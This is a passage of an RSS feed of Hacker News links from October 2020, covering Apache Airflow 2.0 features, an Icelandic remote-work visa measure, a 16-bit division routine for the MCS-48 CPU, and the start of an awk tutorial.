<img src="https://joshwithers.blog/uploads/2020/a4e4a17637.jpg"></p>

<h2 id="video">Video</h2>

<p><strong><a href="https://vimeo.com/473792216/4b27389374">iPhone 6 video</a></strong>
<iframe src="https://player.vimeo.com/video/473792216" width="550" height="306" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p>

<p><strong><a href="https://vimeo.com/473792332/ea846c3a08">iPhone SE video</a></strong>
<iframe src="https://player.vimeo.com/video/473792332" width="550" height="306" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p>

<p><strong><a href="https://vimeo.com/473792505/ac67864513">iPhone XS video</a></strong>
<iframe src="https://player.vimeo.com/video/473792505" width="550" height="306" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p>

<p><strong><a href="https://vimeo.com/473792607/39bd4e5f2e">iPhone 12 video</a></strong>
<iframe src="https://player.vimeo.com/video/473792607" width="550" height="306" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p>

  </section></div>]]>
            </description>
            <link>https://joshwithers.blog/2020/10/30/comparing-the-cameras.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941356</guid>
            <pubDate>Fri, 30 Oct 2020 12:07:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What's Coming in Apache Airflow 2.0]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941352">thread link</a>) | @mmaia
<br/>
October 30, 2020 | https://www.astronomer.io/blog/introducing-airflow-2-0/ | <a href="https://web.archive.org/web/*/https://www.astronomer.io/blog/introducing-airflow-2-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><p><span><img src="https://assets2.astronomer.io/main/blog/airflow-2.png" alt="airflow-2-hero"></span></p></div><div><p>Apache Airflow was created by Airbnb’s Maxime Beauchemin as an open-source project in late 2014. It was brought into the Apache Software Foundation’s Incubator Program in March 2016 and saw growing success in the wake of Maxime’s well-known <a target="_blank" href="https://medium.com/free-code-camp/the-rise-of-the-data-engineer-91be18f1e603">“The Rise of the Data Engineer”</a> blog post. By January of 2019, Airflow was <a target="_blank" href="https://blogs.apache.org/foundation/entry/the-apache-software-foundation-announces44">announced as a Top-Level Apache Project</a> by the Foundation and is now concretely considered the industry’s leading workflow orchestration solution.</p><p>Airflow’s strength as a tool for dataflow automation has grown for a few reasons:</p><p><strong>1. Proven core functionality for data pipelining.</strong>
Airflow competitively delivers in scheduling, scalable task execution and UI-based task management and monitoring.</p><p><strong>2. An extensible framework.</strong>
Airflow was designed to make data integration between systems easy. Today it supports over 55 providers, including AWS, GCP, Microsoft Azure, Salesforce, Slack and Snowflake. Its ability to meet the needs of simple and complex use cases alike make it both easy to adopt and scale.</p><p><strong>3. A large, vibrant community.</strong>
Airflow boasts thousands of users and over 1,600 contributors who regularly submit features, plugins, content and bug fixes to ensure continuous momentum and improvement. In 2020, Airflow reached 10,000 commits and 18,000 GitHub stars.</p><p>As Apache Airflow grows in adoption, there’s no question that a major release to expand on the project’s core strengths has been long overdue. As users and members of the community, we at Astronomer are delighted to announce that Airflow 2.0 is in the alpha testing stage and is scheduled to be generally available in December of 2020.</p><p><span><img src="https://assets2.astronomer.io/main/blog/Airflow-2.0-Home.png" alt="Airflow 2.0 Home"></span></p><p>Over the last year, various organizations and leaders within the Airflow Community have been in close collaboration refining the scope of Airflow 2.0 and actively working towards enhancing existing functionality and introducing changes to make Airflow faster, more reliable and more performant at scale.</p><p>In preparation for the highly anticipated release, we’ve put together an overview of major Airflow 2.0 features below. We’ll publish a series of followup posts over the next few weeks that dive deeper into some of those changes.</p></div><div><p>Airflow 2.0 includes hundreds of features and bug fixes both large and small. Many of the significant improvements were influenced and inspired by feedback from <a target="_blank" href="https://airflow.apache.org/blog/airflow-survey">Airflow's 2019 Community Survey</a>, which garnered over 300 responses.</p><h2>A New Scheduler: Low-Latency + High-Availability</h2><p>The Airflow Scheduler as a core component has been key to the growth and success of the project following its creation in 2014. As Airflow matures and the number of users running hundreds of thousands of tasks grows, however, we at Astronomer saw great opportunity in driving a dedicated effort to improve upon Scheduler functionality and push Airflow to a new level of scalability.</p><p>In fact, "Scheduler Performance" was the most asked for improvement in the Community Survey. Airflow users have found that while the Celery and Kubernetes Executors allow for task execution at scale, the Scheduler often limits the speed at which tasks are scheduled and <em>queued</em> for execution. While effects vary across use cases, it's not unusual for users to grapple with induced downtime and a long recovery in the case of a failure and experience high latency between short-running tasks.</p><p>It is for that reason that we’re beyond ecstatic to introduce a new, refactored Scheduler with the Airflow 2.0 release. The most impactful Airflow 2.0 change in this area is support for running multiple schedulers concurrently in an active/active model. Coupled with DAG Serialization, Airflow’s refactored Scheduler is now highly available, significantly faster and infinitely scalable. Here's a quick overview of new functionality:</p><p><strong>1. Horizontal Scalability.</strong>
If task load on 1 Scheduler increases, a user can now launch additional "replicas" of the Scheduler to increase the throughput of their Airflow Deployment.</p><p><strong>2. Lowered Task Latency.</strong>
In Airflow 2.0, even a single scheduler has proven to schedule tasks at much faster speeds with the same level of CPU and Memory.</p><p><strong>3. Zero Recovery Time.</strong>
Users running 2+ Schedulers will see zero downtime and no recovery time in the case of a failure.</p><p><strong>4. Easier Maintenance.</strong>
The Airflow 2.0 model allows users to make changes to individual schedulers without impacting the rest and inducing downtime.</p><p>The Scheduler's now-zero recovery time and readiness for scale eliminates it as a single point of failure within Apache Airflow. Given the importance of this change, we'll be putting out a series of followup blog posts that dive deeper into the story behind these improvements alongside an architecture overview and benchmark metrics.</p></div><div><h2>Full REST API</h2><p>Data engineers have been using Airflow’s “Experimental API” for years, most often for <a href="https://www.astronomer.io/docs/cloud/stable/customize-airflow/airflow_api">triggering DAG runs programmatically</a>. With that said, the API has historically remained narrow in scope and lacked critical elements of functionality, including a robust authorization and permissions framework.</p><p>Airflow 2.0 introduces a new, comprehensive REST API that sets a strong foundation for a new Airflow UI and CLI in the future. Additionally, the new API:</p><ul><li>Makes for easy access by third-parties</li><li>Is based on the <a target="_blank" href="https://swagger.io/specification">Swagger/OpenAPI Spec</a></li><li>Implements CRUD (Create, Update, Delete) operations on <em>all</em> Airflow resources and </li><li>Includes authorization capabilities (parallel to those of the Airflow UI)</li></ul><p>These capabilities enable a variety of use cases and create new opportunities for automation. For example, users now have the ability to programmatically set Connections and Variables, show import errors, create Pools, and monitor the status of the Metadata Database and Scheduler.</p><p>For more information, you can reference REST API documentation <a target="_blank" href="https://airflow.readthedocs.io/en/latest/stable-rest-api-ref.html">here</a>.</p></div><div><h2>Smart Sensors</h2><p>In the context of dependency management in Airflow, it’s been common for data engineers to design data pipelines that employ <a href="https://www.astronomer.io/guides/what-is-a-sensor"><em>Sensors</em></a>. Sensors are a special kind of Airflow Operator whose purpose is to wait on a particular trigger, such as a file landing at an expected location or an external task completing successfully. Although Sensors are idle for most of their execution time, they nonetheless hold a “worker slot” that can cost significant CPU and memory.</p><p>The “Smart Sensor” introduced in Airflow 2.0 is an “early access” (subject to change) foundational feature that:</p><ul><li>Executes as a single, “long running task” </li><li>Checks the status of a batch of Sensor tasks</li><li>Stores sensor status information in Airflow’s Metadata DB</li></ul><p>This feature was proposed and contributed by Airbnb based on their experience running an impressively large Airflow Deployment with tens of thousands of DAGs. For them, Smart Sensors reduced the number of occupied worker slots by over 50% for concurrent loads in peak traffic.</p><p>To learn more, refer to the Airflow docs on Smart Sensors <a target="_blank" href="https://airflow.readthedocs.io/en/latest/smart-sensor.html">here</a>.</p></div><div><h2>TaskFlow API</h2><p>While Airflow has historically shined in scheduling and running idempotent tasks, it has historically lacked a simple way to pass information <em>between</em> tasks. Let's say you are writing a DAG to train some set of Machine Learning models. A first set of tasks in that DAG generates an identifier for each model and a second set of tasks outputs the results generated by each of those models. In this scenario, what's the best way to pass output from those first set of tasks to the latter?</p><p>Historically, <a target="_blank" href="https://airflow.readthedocs.io/en/latest/concepts.html?highlight=Xcoms#xcoms">XComs</a> have been the standard way to pass information between tasks and would be the most appropriate method to tackle the use case above. As most users know, however, XComs are often cumbersome to use and require redundant boilerplate code to set return variables at the end of a task and retrieve them in downstream tasks.</p><p>With Airflow 2.0, we're excited to introduce the TaskFlow API and Task Decorator to address this challenge. The TaskFlow API  implemented in 2.0 makes DAGs significantly easier to write by abstracting the task and dependency management layer from users. Here's a breakdown of incoming functionality:</p><p><strong>1. A framework that automatically creates PythonOperator tasks from Python functions and handles variable passing.</strong>
Now, variables such as Python Dictionaries can simply be passed between tasks as return and input variables for cleaner and more efficient code.</p><p><strong>2. Task dependencies are abstracted and inferred as a result of the Python function invocation.</strong>
This again makes for much cleaner and more simple DAG writing for all users.</p><p><strong>3. Support for Custom XCom Backends.</strong>
Airflow 2.0 includes support for a new <a target="_blank" href="https://airflow.apache.org/docs/stable/concepts.html?highlight=xcom#custom-xcom-backend"><code>xcom_backend</code> parameter</a> that will allow users to pass even more objects between tasks. Out-of-the-box support for S3, HDFS and other tools is coming soon.</p><p>It's worth noting that the underlying mechanism here is still XCom and data is still stored in Airflow’s Metadata Database, but the XCom operation itself is hidden inside the PythonOperator and is completely abstracted from the DAG developer. Now, Airflow users can pass information and manage dependencies between tasks in a standardized Pythonic manner for cleaner and more efficient code.</p><p>To learn more, refer to Airflow’s official <a target="_blank" href="https://airflow.readthedocs.io/en/latest/concepts.html#taskflow-api">docs here</a> and the <a target="_blank" href="https://airflow.readthedocs.io/en/latest/tutorial_taskflow_api.html">accompanying tutorial</a>.</p></div><div><h2>Task Groups</h2><p><a target="_blank" href="https://airflow.apache.org/docs/stable/concepts.html?highlight=subdag#subdags">Airflow SubDAGs</a> have long been limited in their ability to provide users with an easy way to manage a large number of tasks. The lack of parallelism coupled with confusion around the fact that SubDAG tasks can only be executed by the Sequential Executor, regardless of which Executor is employed for all other tasks, made for a challenging and unreliable user experience.</p><p>Airflow 2.0 introduces Task Groups as a UI construct that doesn’t affect task execution behaviour but fulfills the primary purpose of SubDAGs. Task Groups give a DAG author the management benefits of “grouping” a logical set of tasks with one another without having to look at or process those tasks any differently.</p><p><span><img src="https://assets2.astronomer.io/main/blog/Airflow-2.0-Task-Group.gif" alt="Airflow 2.0 Task Groups"></span></p><p>While Airflow 2.0 will continue to support the SubDAG Operator, Task Groups are intended to replace it in the long-term.</p></div><div><h2>Independent Providers</h2><p>One of Airflow’s signature strengths is its sizable collection of community-built Operators, Hooks, and Sensors …</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.astronomer.io/blog/introducing-airflow-2-0/">https://www.astronomer.io/blog/introducing-airflow-2-0/</a></em></p>]]>
            </description>
            <link>https://www.astronomer.io/blog/introducing-airflow-2-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941352</guid>
            <pubDate>Fri, 30 Oct 2020 12:07:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Iceland enables foreign experts to live in Iceland while working remotely]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941283">thread link</a>) | @SolonIslandus
<br/>
October 30, 2020 | https://www.government.is/news/article/2020/10/27/-Foreign-experts-can-work-remotely-in-Iceland/ | <a href="https://web.archive.org/web/*/https://www.government.is/news/article/2020/10/27/-Foreign-experts-can-work-remotely-in-Iceland/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
<div><article data-last-modified="2020-10-27 17:36:00" data-category="type:News"><header><strong><time>October 27, 2020 </time><span>Ministry of Industries and Innovation, Ministry of Justice, Ministry of Finance and Economic Affairs</span></strong></header><div><figure><a href="https://www.government.is/library/01-Ministries/Ministry-of-Industries-and-Innovation/IMG_4200.jpg" data-lightbox="news-image" data-title="Ms. Áslaug Arna Sigurbjörnsdóttir, Minister of Justice, Ms. Þórdís Kolbrún Reykfjörð Gylfadóttir, Minister of Tourism, Industry and Innovation, Mr. Bjarni Benediktsson, Minister of Finance and Economic affairs."><img src="https://www.government.is/library/01-Ministries/Ministry-of-Industries-and-Innovation/IMG_4200.jpg?proc=singleNewsItem" alt="Ms. Áslaug Arna Sigurbjörnsdóttir, Minister of Justice, Ms. Þórdís Kolbrún Reykfjörð Gylfadóttir, Minister of Tourism, Industry and Innovation, Mr. Bjarni Benediktsson, Minister of Finance and Economic affairs. - mynd"></a><span></span></figure></div><section><p>The Minister of Tourism, Industry, and Innovation, the Minister of Justice and the Minister of Finance and Economic Affairs have put in place measures to enable non-EEA foreign nationals to reside in Iceland for up to six months and telework for foreign companies. With the measure, those foreign citizens, who are exempt from the visa requirements, will be allowed to apply for a long-term visa in Iceland for teleworkers and bring their families without having to move their legal domicile to the country or obtain Icelandic ID numbers.</p>
<p>In the wake of the COVID-19 epidemic, many companies around the world have made significant changes to the way they operate and are now increasingly allowing and encouraging their staff to telework. The result is that in many instances the staff member can choose their home environment, irrespective of the location of their workplace.</p>
<p>Ms. Þórdís Kolbrún Reykfjörð Gylfadóttir, Minister of Tourism, Innovation and Industry:</p>
<p><em><span>“We need to shape our export industry, based on ingenuity and by making it easier for foreign nationals to work from Iceland, we add value, knowledge and connections in Iceland that support our innovation environment.”</span></em></p>
<p>At the initiative of the Minister of Innovation, in collaboration with the Ministry of Justice and Ministry of Finance and Economic Affairs, an authorization has been implemented for those who are permanently employed with foreign companies so that they can stay and work in Iceland for up to six months. Until now the authorisation has only been for 90 days. In order to be granted permission for this longer stay, the person in question must demonstrate an employment relationship, income and health insurance. The Icelandic government will keep looking into the matter to find ways of extending the time period, but for now regulations have been changed to accommodate the six month period.</p>
<p>Mr. Bjarni Benediktsson, Minister of Finance and Economic Affairs:</p>
<span>“<em>We want to ensure that with regards to taxation, there is nothing to prevent the possibility of temporarily allowing individuals working for foreign companies to work from Iceland. We believe that these individuals will bring with them valuable experience and connections that will benefit Iceland on its path to economic recovery from effects of the Covid-19 pandemic</em><span>”</span>&nbsp;</span>
<p>Ms. Áslaug Arna Sigurbjörnsdóttir, Minister of Justice:&nbsp;</p>
<p>
<span>“<em>Fast technological developments call for us to be open and flexible to the growing opportunities available to us that arise when more employers encourage teleworking. The regulatory framework must take this into account.</em>”</span></p>
<p>Promote Iceland will provide further information and handle promotion of the initiative: <a href="https://www.government.is/cdn-cgi/l/email-protection#1e69716c755e777d7b727f707a30776d"><span data-cfemail="196e766b7259707a7c7578777d37706a">[email&nbsp;protected]</span></a>.&nbsp;</p></section><h2>Tags</h2></article></div>

</div><div>
<div>
<p>This website uses cookies to ensure you get the best experience on our website. <a href="https://www.government.is/default.aspx?pageid=c7a1ba64-7428-4803-90e2-cbce7fd71d9b">Read more</a></p>
</div>
</div></div>]]>
            </description>
            <link>https://www.government.is/news/article/2020/10/27/-Foreign-experts-can-work-remotely-in-Iceland/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941283</guid>
            <pubDate>Fri, 30 Oct 2020 11:57:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MCS-48: The quest for 16-bit division on the 8-bit CPU which can’t divide]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 29 (<a href="https://news.ycombinator.com/item?id=24941189">thread link</a>) | @noexani
<br/>
October 30, 2020 | http://tech.mattmillman.com/mcs-48-the-quest-for-16-bit-division-on-the-8-bit-cpu-which-cant-divide-anything/ | <a href="https://web.archive.org/web/*/http://tech.mattmillman.com/mcs-48-the-quest-for-16-bit-division-on-the-8-bit-cpu-which-cant-divide-anything/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4862">
	
	<!-- .entry-header -->

		<div>
		
<p>Recently while working on my <a href="http://tech.mattmillman.com/projects/an-intel-mcs-48-based-dual-temperature-sensor/">MCS-48 temperature sensor</a> project I had to confront one of the largest challenges, which is to implement an option where changing a jumper displayed Fahrenheit instead of Celsius. The output from the DS18B10 temperature sensors is Celsius only, as it should be, so a conversion would need to be performed.</p>



<figure><img src="http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/CodeCogsEqn.gif" alt=""><figcaption>A quick reminder of the conversion needed to be performed</figcaption></figure>



<p>In my case it’s +320 as I’m using fixed point arithmetic i.e. 15.3° = 153. This is a tough conversion to perform on an MCS-48 as a slew of different operations are required:</p>



<ul><li>16-bit negate (more about that below)</li><li>16-bit unsigned multiply</li><li>16-bit unsigned divide</li><li>16-bit add with wrap-around</li></ul>



<p>A tall order for a CPU which has just <em>one </em>math instruction: 8-bit add. To perform all of this, one must sling a long sequence of primitive instructions together. Since this is an assembly language only architecture, I couldn’t cheat by compiling it in C and pinching the resulting instructions as I have done for PIC16 in the past.</p>



<p><em>Edit: Since publishing this a cornucopia of different approaches to this problem have been proposed to me. I’m happy with implementation as it currently stands. It works, it makes very efficient use of program memory, the improved performance is not required, and the above math routines are re-used for other tasks in the project.</em></p>



<p>The best place to find such examples is in the MCS-48 assembly language manual:</p>



<figure><a href="http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual.jpg"><img src="http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual-800x638.jpg" alt="" srcset="http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual-800x638.jpg 800w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual-300x239.jpg 300w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual-150x120.jpg 150w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual-768x612.jpg 768w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual-1536x1224.jpg 1536w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual-2048x1633.jpg 2048w" sizes="(max-width: 800px) 100vw, 800px"></a></figure>



<p>(A scan of it can be viewed <a href="http://www.nj7p.org/Manuals/PDFs/Intel/9800255D.pdf">here</a>). Everything I needed was in there, except how to divide. There is no mention whatsoever in that manual of how to perform any kind of division operation, <em>but</em>, tacked in the back of the 1980 edition MCS-48 handbook, I found this:</p>



<figure><a href="http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv.png"><img src="http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv-623x800.png" alt="" srcset="http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv-623x800.png 623w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv-233x300.png 233w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv-117x150.png 117w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv-768x987.png 768w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv-1195x1536.png 1195w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv.png 1263w" sizes="(max-width: 623px) 100vw, 623px"></a><figcaption>Woohoo! A working divide routine for MCS-48. It wouldn’t OCR, so I typed it up.</figcaption></figure>



<p>Unfortunately that routine only has an 8-bit quotient, which isn’t much use for my application because it would overflow in most cases.</p>



<p>I was easily able to work around that with the following implementation (pseudo code):</p>



<pre><code>if (celsius &lt; 0)
{   // If negative, note it, and make it positive
    // so we can work with simpler unsigned routines below
    celsius = -celsius;
    is_negative = 1;
}

fahrenheit = multiply_16x8r16(celsius, 9);

// Divide by 50 so the result of divide_16x8r8 doesn't overflow
fahrenheit = divide_16x8r8(fahrenheit, 50, &amp;remainder);

// Multiply it back up
fahrenheit = multiply_16x8r16(fahrenheit, 10);

// Factor remainder
remainder = multiply_16x8r16(remainder, 10);

// Divide and add remainder
fahrenheit += divide_16x8r8(remainder, 50, NULL);

if (is_negative)
{   // Make it negative again, if it was previously
    is_negative = 1;
}

// Add 32. Requires a 16-bit add with wrap around to
// correctly handle negative temperatures
fahrenheit += 320</code></pre>



<p>While that does the job, it’s poo poo. What I really want is that complicated looking divide routine to have a 16-bit quotient, so I can do the division in a single operation. To help me understand it, I translated it to C code:</p>



<pre><code>uint8_t mcs48_divide(uint16_t dividend, uint8_t divisor, uint8_t *remainder)
{
    if ((dividend &gt;&gt; 8) &gt;= divisor)
        goto mcs48_div_exit; // Impossible. Result would
                             // overflow. Bail.

    for (int i = 0; i &lt; 8; i++) // One pass for each bit of result
    {
        uint8_t msb;
        uint8_t bit15_was_set = 0;

        if (dividend &amp; 0x8000)
            bit15_was_set = 1; // Note if this was set,

        dividend &lt;&lt;= 1; // Next bit

        msb = (dividend &gt;&gt; 8);
        if (msb &gt;= divisor || bit15_was_set)
        {
            // Subtract remainder from MSB,
            // preserve and increment quotient
            dividend = (((msb - divisor) &lt;&lt; 8) | (dividend &amp; 0xFF)) + 1;
        }
    }

mcs48_div_exit:
    *remainder = (dividend &gt;&gt; 8);
    return (dividend &amp; 0xFF);
}</code></pre>



<p>It’s immediately clear that it’s a <a href="https://www.wikihow.com/Divide-Binary-Numbers">binary division</a> implementation. What wasn’t immediately clear is how to make the change I wanted. I put the question to <a href="https://stackoverflow.com/questions/64544654/can-anyone-figure-out-how-to-extend-this-software-divide-routine-to-have-a-16-bi/64549557#64549557">stack overflow</a>, and on the face of it, it looked like a dumb question, i.e. just double the integer type sizes, <em>stupid</em>. predictably I got punished with a bunch of down-votes.</p>



<p>Yes we can do that, but it’s not what I want to do to the assembly routine that I’m trying to modify, so perhaps I didn’t quite ask the question as well as I could have done. The answer provided sent me in the right direction, in that the working accumulator needs to be larger, 24-bits in my case, and the 16-bit shift needs to be a 24-bit.</p>



<pre><code>uint16_t mcs48_div16(uint16_t dividend, uint8_t divisor, uint8_t *remainder)
{
    uint32_t accumulator = dividend;

    for (int i = 0; i &lt; 16; i++) // One pass for each bit of result
    {
        uint8_t msb;
        uint8_t bit24_was_set = 0;

        if (accumulator &amp; 0x800000)
            bit24_was_set = 1; // Note if this was set,
                               // can't check if after shift.

        accumulator &lt;&lt;= 1; // Next bit
        accumulator &amp;= 0xFFFFFF; // Simulate 24 bit type

        msb = (accumulator &gt;&gt; 16);
        if (msb &gt;= divisor || bit24_was_set)
        {
            // Subtract remainder from MSB,
            // preserve and increment quotient
            accumulator = (((msb - divisor) &lt;&lt; 16) | (accumulator &amp; 0xFFFF)) + 1;
        }
    }

mcs48_div_ext_exit:
    *remainder = (accumulator &gt;&gt; 16);
    return (accumulator &amp; 0xFFFF);
}</code></pre>



<p>Above is the pseudo code of my routine after the changes. In the final implementation registers A, R1 and R2 hold the 24-bit accumulator, so this doesn’t translate too well to C because there isn’t a 24-bit integer type.</p>



<p>The final changes to the routine can be viewed <a href="https://github.com/inaxeon/mcs48temp/compare/e006467..a531d32">here</a>.</p>



<p>Ah, that’s better.</p>
	</div><!-- .entry-content -->
	
	</article></div>]]>
            </description>
            <link>http://tech.mattmillman.com/mcs-48-the-quest-for-16-bit-division-on-the-8-bit-cpu-which-cant-divide-anything/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941189</guid>
            <pubDate>Fri, 30 Oct 2020 11:39:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Awk: `Begin { ` Part 1]]>
            </title>
            <description>
<![CDATA[
Score 215 | Comments 101 (<a href="https://news.ycombinator.com/item?id=24940661">thread link</a>) | @quyleanh
<br/>
October 30, 2020 | https://jemma.dev/blog/awk-part-1 | <a href="https://web.archive.org/web/*/https://jemma.dev/blog/awk-part-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>The other day, I was watching Bryan Cantrill’s 2018 talk, <a href="https://www.youtube.com/watch?v=2wZ1pCpJUIM">Rust, and Other Interesting Things</a>, and he made an offhanded comment while discussing values of different programming languages and communities. He said, “If you get the <a href="https://www.gnu.org/software/gawk/manual/gawk.html">awk programming language manual</a>…you’ll read it in about two hours and then you’re done. That’s it. You know all of awk.”</p>

<p>Only two hours to learn an entire language?! …. Challenge accepted!</p>

<p>I had previously used snippets of awk here and there. Most of them were given to me by Stack Overflow answers when googling for niche data file manipulations. But, I did not know enough to successfully write an awk program from scratch. I definitely did not have a real grasp on the language nor its power. And, a couple of hours sounded like a relatively small time investment to learn what Bryan Cantrill said was a language he used three times a day.</p>

<p>It turns out it takes more than two hours to learn awk, and I am by no means an expert… yet (growth mindset!). But, I now know enough to write a little about the essentials. Here goes!</p>

<h3 id="what-is-awk-useful-for">What is awk useful for?</h3>

<p>Awk is useful for data file manipulation. Already, having used it for a few days only, I wish I had invested time in learning it earlier. My usual workflow when encountering a data file is to import it into Google Sheets and use their builtin functions. If those weren’t enough, I would write little code snippets to somewhat awk..wardly get the information I want. Awk is way more powerful than what I was doing before. Let’s take a look:</p>

<h3 id="running-awk-programs">Running awk programs</h3>

<p>If we’re going to learn awk, we need to know how to run an awk program. The syntax to run an awk program in a shell is:</p>
<div><div><pre><code><span>$ </span><span>awk</span> <span>'awk_program_contents'</span> data-file-1 data-file-2
</code></pre></div></div>
<p>We can also write a longer awk program to run instead of writing the awk code inline. We could write a file with awk codeand then pass inline to awk with <code>-f &lt;awk-program-filename&gt;</code></p>
<div><div><pre><code><span>$ </span><span>awk</span> <span>-f</span> awk-program.awk data-file-1 data-file-2
</code></pre></div></div>

<h3 id="awk-program-contents">awk program contents</h3>

<p>Well, what is an awk program? We know it is best used for simple data reformatting or manipulation. The way it does this is by performing different actions on different patterns within a data file. The basic syntax of an awk program depends on these pattern and actions.</p>

<div><div><pre><code>pattern <span>{</span> action <span>}</span>
pattern <span>{</span> action <span>}</span>
...
</code></pre></div></div>

<p>We can give as many <code>pattern { action }</code> pairs as we want. Each pair will be executed independently of the others. This means if a line matches more than one pattern, it will have more than one corresponding action. In the example above we use newlines to separate distinct pairs. Similar to bash, we can also use <code>;</code> to separate commands and put everything on one line: <code>pattern { action }; pattern { action }</code></p>

<h3 id="awk-with-data-files">awk with data files</h3>

<p>But, it turns out awk is much more useful (and fun!) with a data file. The UN has a few <a href="https://data.un.org/">publicly available datasets</a>. I picked <a href="https://data.un.org/_Docs/SYB/CSV/SYB62_309_201906_Education.csv">this one</a> on education at the primary, secondary and tertiary levels to delve into first.</p>

<p>Let’s start by using awk to get a sense of what the data looks like.  <code>NR</code> is a predefined variable which records the number of rows read in a file so far. We can use it to look at the first few lines of a program. In this case, our pattern will be <code>NR &lt;= 5</code>, and by not including an action, the implied action will be <code>print</code>:</p>
<div><div><pre><code><span>$ </span><span>awk</span> <span>'NR &lt;= 5'</span> education.csv
T07,<span>"Enrolment in primary, secondary and tertiary education levels"</span>,,,,,
Region/Country/Area,,Year,Series,Value,Footnotes,Source
1,<span>"Total, all countries or areas"</span>,2005,Students enrolled <span>in </span>primary education <span>(</span>thousands<span>)</span>,<span>"678,991.6070"</span>,,<span>"United Nations Educational, Scientific and Cultural Organization (UNESCO), Montreal, the UNESCO Institute for Statistics (UIS) statistics database, last accessed March 2019."</span>
1,<span>"Total, all countries or areas"</span>,2005,Gross enrollement ratio - Primary <span>(</span>male<span>)</span>,104.9360,,<span>"United Nations Educational, Scientific and Cultural Organization (UNESCO), Montreal, the UNESCO Institute for Statistics (UIS) statistics database, last accessed March 2019."</span>
1,<span>"Total, all countries or areas"</span>,2005,Gross enrollment ratio - Primary <span>(</span>female<span>)</span>,99.9214,,<span>"United Nations Educational, Scientific and Cultural Organization (UNESCO), Montreal, the UNESCO Institute for Statistics (UIS) statistics database, last accessed March 2019."</span>
</code></pre></div></div>
<p>Okay, so looks like this is giving us a bit of information about our file. Notably:</p>
<ol>
  <li>There are two header rows: a title row, and a row telling us what the fields are</li>
  <li>The file is comma separated</li>
  <li>… except there are sometimes commas within double quoted strings: <code>"Total, all countries or areas"</code></li>
</ol>

<p>Let’s address these one by one!</p>



<p>We can ignore the first two header rows by using our nifty <code>NR</code> moving forward. We can pattern match that <code>NR &gt; 2</code>. Note: awk is 1-indexed.</p>
<div><div><pre><code><span>$ </span><span>awk</span> <span>'NR &gt; 2'</span> education.csv
</code></pre></div></div>

<h3 id="field-separators">Field Separators</h3>

<p>awk’s <a href="https://www.gnu.org/software/gawk/manual/gawk.html#Default-Field-Splitting">default field separator</a> is a space. We can actually see this by printing the first field. To access the value of a field, we use <code>$&lt;field_index&gt;</code>. So <code>$1</code> is the first field, <code>$2</code> the second, and so on. <code>$0</code> refers to the entire row.</p>

<p>If we try this:</p>
<div><div><pre><code><span>$ </span><span>awk</span> <span>'NR &lt;= 5 { print $1 }'</span> education.csv
T07,<span>"Enrolment
Region/Country/Area,,Year,Series,Value,Footnotes,Source
1,"</span>Total,
1,<span>"Total,
1,"</span>Total,
</code></pre></div></div>
<p>we can confirm that we’re splitting on spaces. awk has the option to specify a different field separator with the <code>-F 'separator'</code> flag:</p>
<div><div><pre><code><span>$ </span><span>awk</span> <span>-F</span> <span>','</span> <span>'NR &lt;= 5 { print $1 }'</span> education.csv
T07
Region/Country/Area
1
1
1
</code></pre></div></div>

<p>Great! But…. we had commas embedded within strings with double quotes. Sure enough, if we print the second field (<code>$2</code>), we see:</p>

<div><div><pre><code><span>$ </span><span>awk</span> <span>-F</span> <span>','</span> <span>'NR &lt;= 5 { print $2 }'</span> education.csv
<span>"Enrolment in primary

"</span>Total
<span>"Total
"</span>Total
</code></pre></div></div>

<p>Hmmm. What we want here is to split fields by <em>content</em>. Which awk does not have, but gawk (GNU awk) does: <a href="https://www.gnu.org/software/gawk/manual/gawk.html#Splitting-By-Content">FPAT</a>! From the gawk manual: “All properly written awk programs should work with gawk. So most of the time, we don’t distinguish between gawk and other awk implementations.”</p>

